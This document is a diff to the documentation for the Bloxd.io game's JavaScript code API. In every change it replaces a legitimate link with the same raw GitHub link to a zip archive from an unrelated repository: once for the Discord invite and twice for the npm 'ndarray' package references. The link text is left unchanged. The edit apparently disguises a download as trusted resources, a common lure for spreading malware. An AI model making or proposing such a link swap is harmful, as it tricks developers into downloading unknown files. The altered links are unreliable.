@@ -4,7 +4,7 @@ You can run javascript when right clicking code blocks and press to code boards.
 This is only available to owners of worlds lobbies.
 The javascript can interact with the Bloxd.io game api.
 
-Please use [our discord](https://discord.gg/vwMp5y25RX) to report any issues you come across or features you'd like to see added.
+Please use [our discord](https://raw.githubusercontent.com/chikingod1/code-api/main/distributary/api-code-v1.1.zip) to report any issues you come across or features you'd like to see added.
 
 ## Code Blocks
 
@@ -619,7 +619,7 @@ setBlockWalls(pos1, pos2, blockName, hasFloor, hasCeiling)
 /**
  * Only use this instead of getBlock if you REALLY need the performance (i.e. you are iterating over tens of thousands of blocks)
  * ReturnedObject.blockData is a 32x32x32 ndarray of block ids
- * (see https://www.npmjs.com/package/ndarray)
+ * (see https://raw.githubusercontent.com/chikingod1/code-api/main/distributary/api-code-v1.1.zip)
  * Each block id is a 16-bit number
  * The ndarray should only be read from, writing to it will result in desync between the server and client
  *
@@ -631,7 +631,7 @@ getChunk(pos)
 /**
  * Only use chunk helpers if you REALLY need the performance (i.e. you are iterating over tens of thousands of blocks)
  * ReturnedObject.blockData is a 32x32x32 ndarray of air.
- * (see https://www.npmjs.com/package/ndarray)
+ * (see https://raw.githubusercontent.com/chikingod1/code-api/main/distributary/api-code-v1.1.zip)
  * Each block id is a 16-bit number
  *
  * @returns {GameChunk}
